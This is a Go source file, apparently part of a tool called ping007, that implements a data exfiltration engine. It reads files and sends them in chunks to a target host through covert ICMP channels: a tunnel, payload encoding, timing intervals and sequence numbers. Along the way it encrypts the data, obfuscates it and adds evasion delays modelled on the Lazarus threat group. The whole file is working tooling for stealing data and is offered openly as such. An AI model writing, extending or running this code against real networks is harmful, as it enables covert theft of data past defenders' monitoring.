package exfiltration

import (
	"crypto/sha256"
	"fmt"
	"os"
	"sync"
	"time"

	"ping007/internal/crypto"
	"ping007/internal/evasion"
	"ping007/internal/network"
	"ping007/pkg/types"
)

// ExfiltrationEngine handles data exfiltration operations
type ExfiltrationEngine struct {
	networkService *network.NetworkService
	cryptoEngine   *crypto.CryptoEngine
	evasionEngine  *evasion.EvasionEngine
	config         ExfiltrationConfig
	activeJobs     map[string]*types.ExfilJob
	mu             sync.RWMutex
}

type ExfiltrationConfig struct {
	MaxConcurrentJobs int
	DefaultChunkSize  int
	MaxRetries        int
	ChunkTimeout      time.Duration
	ProgressCallback  func(jobID string, progress float64)
}

func NewExfiltrationEngine(
	networkService *network.NetworkService,
	cryptoEngine *crypto.CryptoEngine,
	evasionEngine *evasion.EvasionEngine,
	config ExfiltrationConfig,
) *ExfiltrationEngine {
	return &ExfiltrationEngine{
		networkService: networkService,
		cryptoEngine:   cryptoEngine,
		evasionEngine:  evasionEngine,
		config:         config,
		activeJobs:     make(map[string]*types.ExfilJob),
	}
}

// ExfiltrateFile starts an exfiltration job for a file
func (e *ExfiltrationEngine) ExfiltrateFile(job *types.ExfilJob) (*types.ExfilResult, error) {
	// Validate job
	if err := e.validateJob(job); err != nil {
		return nil, fmt.Errorf("job validation failed: %w", err)
	}

	// Check concurrent jobs limit
	e.mu.Lock()
	if len(e.activeJobs) >= e.config.MaxConcurrentJobs {
		e.mu.Unlock()
		return nil, fmt.Errorf("maximum concurrent jobs reached")
	}
	e.activeJobs[job.ID] = job
	e.mu.Unlock()

	// Clean up on completion
	defer func() {
		e.mu.Lock()
		delete(e.activeJobs, job.ID)
		e.mu.Unlock()
	}()

	// Load file data if source path is specified
	if job.SourcePath != "" {
		data, err := e.loadFile(job.SourcePath)
		if err != nil {
			return nil, fmt.Errorf("failed to load file: %w", err)
		}
		job.Data = data
	}

	// Start exfiltration
	return e.performExfiltration(job)
}

// ExfiltrateData starts an exfiltration job for raw data
func (e *ExfiltrationEngine) ExfiltrateData(job *types.ExfilJob) (*types.ExfilResult, error) {
	if len(job.Data) == 0 {
		return nil, fmt.Errorf("no data to exfiltrate")
	}

	return e.ExfiltrateFile(job)
}

// performExfiltration executes the exfiltration process
func (e *ExfiltrationEngine) performExfiltration(job *types.ExfilJob) (*types.ExfilResult, error) {
	startTime := time.Now()

	result := &types.ExfilResult{
		JobID:     job.ID,
		Metadata:  make(map[string]any),
		Errors:    make([]string, 0),
	}

	// Create chunks
	chunks, err := e.createChunks(job)
	if err != nil {
		return nil, fmt.Errorf("failed to create chunks: %w", err)
	}

	result.ChunksTotal = len(chunks)

	// Execute exfiltration based on method
	switch job.Method {
	case types.ExfilICMPTunnel:
		err = e.exfiltrateViaICMPTunnel(job, chunks, result)
	case types.ExfilICMPPayload:
		err = e.exfiltrateViaICMPPayload(job, chunks, result)
	case types.ExfilICMPTiming:
		err = e.exfiltrateViaICMPTiming(job, chunks, result)
	case types.ExfilICMPSeq:
		err = e.exfiltrateViaICMPSequence(job, chunks, result)
	default:
		return nil, fmt.Errorf("unsupported exfiltration method: %s", job.Method)
	}

	// Calculate final metrics
	result.Duration = time.Since(startTime)
	result.CompletedAt = time.Now()
	result.Success = err == nil && result.ChunksSent == result.ChunksTotal

	if err != nil {
		result.Errors = append(result.Errors, err.Error())
	}

	return result, err
}

// createChunks splits data into manageable chunks
func (e *ExfiltrationEngine) createChunks(job *types.ExfilJob) ([]*types.DataChunk, error) {
	data := job.Data
	chunkSize := job.ChunkSize
	if chunkSize <= 0 {
		chunkSize = e.config.DefaultChunkSize
	}

	// Calculate total chunks
	totalChunks := (len(data) + chunkSize - 1) / chunkSize
	chunks := make([]*types.DataChunk, 0, totalChunks)

	// Create chunks
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}

		chunkData := data[i:end]

		// Apply encryption if enabled
		if job.EncryptEnabled && e.cryptoEngine != nil {
			encryptedData, err := e.cryptoEngine.Encrypt(chunkData)
			if err != nil {
				return nil, fmt.Errorf("encryption failed for chunk %d: %w", len(chunks), err)
			}
			chunkData = encryptedData
		}

		// Calculate checksum
		checksum := fmt.Sprintf("%x", sha256.Sum256(chunkData))

		chunk := &types.DataChunk{
			ID:          len(chunks),
			Data:        chunkData,
			TotalChunks: totalChunks,
			Checksum:    checksum,
			Status:      types.StatusPending,
			Timestamp:   time.Now(),
			RetryCount:  0,
		}

		chunks = append(chunks, chunk)
	}

	return chunks, nil
}

// exfiltrateViaICMPTunnel transmits data via ICMP tunnel method
func (e *ExfiltrationEngine) exfiltrateViaICMPTunnel(job *types.ExfilJob, chunks []*types.DataChunk, result *types.ExfilResult) error {
	packetBuilder := network.NewPacketBuilder(fmt.Sprintf("exfil-%s", job.ID))

	for _, chunk := range chunks {
		// Apply stealth techniques if enabled
		if job.StealthEnabled && e.evasionEngine != nil {
			// Calculate adaptive delay
			profile, err := e.evasionEngine.GenerateTimingProfile(types.APTLazarus)
			if err == nil {
				delay, err := e.evasionEngine.CalculateAdaptiveDelay(profile, len(chunk.Data))
				if err == nil && delay > 0 {
					time.Sleep(delay)
				}
			}

			// Obfuscate data
			obfuscatedData, err := e.evasionEngine.ObfuscateData(chunk.Data)
			if err == nil {
				chunk.Data = obfuscatedData
			}
		}

		// Send chunk with retry logic
		err := e.sendChunkWithRetries(job, chunk, packetBuilder, result)
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("Chunk %d failed: %v", chunk.ID, err))
			continue
		}

		result.ChunksSent++
		result.BytesSent += int64(len(chunk.Data))

		// Update progress
		if e.config.ProgressCallback != nil {
			progress := float64(result.ChunksSent) / float64(result.ChunksTotal)
			e.config.ProgressCallback(job.ID, progress)
		}
	}

	return nil
}

// exfiltrateViaICMPPayload transmits data via ICMP payload encoding
func (e *ExfiltrationEngine) exfiltrateViaICMPPayload(job *types.ExfilJob, chunks []*types.DataChunk, result *types.ExfilResult) error {
	packetBuilder := network.NewPacketBuilder(fmt.Sprintf("payload-%s", job.ID))

	for _, chunk := range chunks {
		// Encode chunk data in ICMP payload
		packet := packetBuilder.CreateChunkPacket(chunk)

		// Add payload-specific headers
		packet.Headers["encoding"] = "base64"
		packet.Headers["method"] = "icmp_payload"

		// Send packet
		err := e.networkService.SendPacket(packet, job.Target)
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("Payload chunk %d failed: %v", chunk.ID, err))
			continue
		}

		chunk.Status = types.StatusSent
		result.ChunksSent++
		result.BytesSent += int64(len(chunk.Data))
	}

	return nil
}

// exfiltrateViaICMPTiming uses timing intervals to encode data
func (e *ExfiltrationEngine) exfiltrateViaICMPTiming(job *types.ExfilJob, chunks []*types.DataChunk, result *types.ExfilResult) error {
	packetBuilder := network.NewPacketBuilder(fmt.Sprintf("timing-%s", job.ID))

	for _, chunk := range chunks {
		// Encode data in timing intervals
		for _, b := range chunk.Data {
			// Convert byte to timing delay (each bit = 100ms base + bit value * 50ms)
			for bit := 0; bit < 8; bit++ {
				bitValue := (b >> bit) & 1
				delay := time.Duration(100+int(bitValue)*50) * time.Millisecond

				// Send ping
				packet := packetBuilder.CreateDataPacket([]byte{b}, "timing")
				err := e.networkService.SendPacket(packet, job.Target)
				if err != nil {
					result.Errors = append(result.Errors, fmt.Sprintf("Timing bit failed: %v", err))
					continue
				}

				// Apply timing delay
				time.Sleep(delay)
			}
		}

		chunk.Status = types.StatusSent
		result.ChunksSent++
		result.BytesSent += int64(len(chunk.Data))
	}

	return nil
}

// exfiltrateViaICMPSequence uses sequence numbers to encode data
func (e *ExfiltrationEngine) exfiltrateViaICMPSequence(job *types.ExfilJob, chunks []*types.DataChunk, result *types.ExfilResult) error {
	packetBuilder := network.NewPacketBuilder(fmt.Sprintf("sequence-%s", job.ID))

	for _, chunk := range chunks {
		// Encode data in sequence numbers
		for i, b := range chunk.Data {
			packet := packetBuilder.CreateDataPacket([]byte{}, "sequence")

			// Encode byte value in sequence ID
			packet.Headers["sequence_data"] = b
			packet.Metadata.SequenceID = uint16(b)

			err := e.networkService.SendPacket(packet, job.Target)
			if err != nil {
				result.Errors = append(result.Errors, fmt.Sprintf("Sequence byte %d failed: %v", i, err))
				continue
			}

			// Small delay between sequence packets
			time.Sleep(10 * time.Millisecond)
		}

		chunk.Status = types.StatusSent
		result.ChunksSent++
		result.BytesSent += int64(len(chunk.Data))
	}

	return nil
}

// sendChunkWithRetries sends a chunk with retry logic
func (e *ExfiltrationEngine) sendChunkWithRetries(job *types.ExfilJob, chunk *types.DataChunk, packetBuilder *network.PacketBuilder, result *types.ExfilResult) error {
	maxRetries := job.MaxRetries
	if maxRetries <= 0 {
		maxRetries = e.config.MaxRetries
	}

	var lastErr error
	for attempt := 0; attempt <= maxRetries; attempt++ {
		chunk.Status = types.StatusSending
		chunk.RetryCount = attempt

		// Create packet for this chunk
		packet := packetBuilder.CreateChunkPacket(chunk)

		// Send packet
		err := e.networkService.SendPacket(packet, job.Target)
		if err == nil {
			chunk.Status = types.StatusSent
			return nil
		}

		lastErr = err
		chunk.Status = types.StatusFailed

		// Wait before retry (exponential backoff)
		if attempt < maxRetries {
			retryDelay := time.Duration(1<<attempt) * time.Second
			time.Sleep(retryDelay)
		}
	}

	return fmt.Errorf("chunk failed after %d retries: %w", maxRetries, lastErr)
}

// validateJob validates an exfiltration job
func (e *ExfiltrationEngine) validateJob(job *types.ExfilJob) error {
	if job.ID == "" {
		return fmt.Errorf("job ID is required")
	}

	if job.Target == "" {
		return fmt.Errorf("target is required")
	}

	if job.SourcePath == "" && len(job.Data) == 0 {
		return fmt.Errorf("either source path or data is required")
	}

	if job.ChunkSize < 0 {
		return fmt.Errorf("invalid chunk size")
	}

	// Validate method
	validMethods := map[types.ExfiltrationMethod]bool{
		types.ExfilICMPTunnel:  true,
		types.ExfilICMPPayload: true,
		types.ExfilICMPTiming:  true,
		types.ExfilICMPSeq:     true,
	}

	if !validMethods[job.Method] {
		return fmt.Errorf("invalid exfiltration method: %s", job.Method)
	}

	return nil
}

// loadFile reads file data from disk
func (e *ExfiltrationEngine) loadFile(filePath string) ([]byte, error) {
	// Check if file exists
	info, err := os.Stat(filePath)
	if err != nil {
		return nil, fmt.Errorf("file not accessible: %w", err)
	}

	// Check if it's a regular file
	if !info.Mode().IsRegular() {
		return nil, fmt.Errorf("not a regular file: %s", filePath)
	}

	// Read file
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read file: %w", err)
	}

	return data, nil
}

// GetActiveJobs returns currently active exfiltration jobs
func (e *ExfiltrationEngine) GetActiveJobs() []*types.ExfilJob {
	e.mu.RLock()
	defer e.mu.RUnlock()

	jobs := make([]*types.ExfilJob, 0, len(e.activeJobs))
	for _, job := range e.activeJobs {
		jobs = append(jobs, job)
	}

	return jobs
}

// CancelJob cancels an active exfiltration job
func (e *ExfiltrationEngine) CancelJob(jobID string) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	job, exists := e.activeJobs[jobID]
	if !exists {
		return fmt.Errorf("job not found: %s", jobID)
	}

	// Mark job as cancelled (implementation would need cancellation context)
	delete(e.activeJobs, jobID)

	// Log cancellation
	job.Metadata["cancelled"] = true
	job.Metadata["cancelled_at"] = time.Now()

	return nil
}

// GetJobStats returns statistics about exfiltration jobs
func (e *ExfiltrationEngine) GetJobStats() map[string]any {
	e.mu.RLock()
	defer e.mu.RUnlock()

	return map[string]any{
		"active_jobs":        len(e.activeJobs),
		"max_concurrent":     e.config.MaxConcurrentJobs,
		"default_chunk_size": e.config.DefaultChunkSize,
		"max_retries":        e.config.MaxRetries,
	}
}

type ExfiltrationMonitor struct {
	engine *ExfiltrationEngine
}

func NewExfiltrationMonitor(engine *ExfiltrationEngine) *ExfiltrationMonitor {
	return &ExfiltrationMonitor{
		engine: engine,
	}
}

// GetProgress returns progress for a specific job
func (em *ExfiltrationMonitor) GetProgress(jobID string) (float64, error) {
	jobs := em.engine.GetActiveJobs()
	for _, job := range jobs {
		if job.ID == jobID {
			// Calculate progress based on metadata
			if progress, exists := job.Metadata["progress"]; exists {
				if p, ok := progress.(float64); ok {
					return p, nil
				}
			}
			return 0.0, nil
		}
	}

	return 0.0, fmt.Errorf("job not found: %s", jobID)
}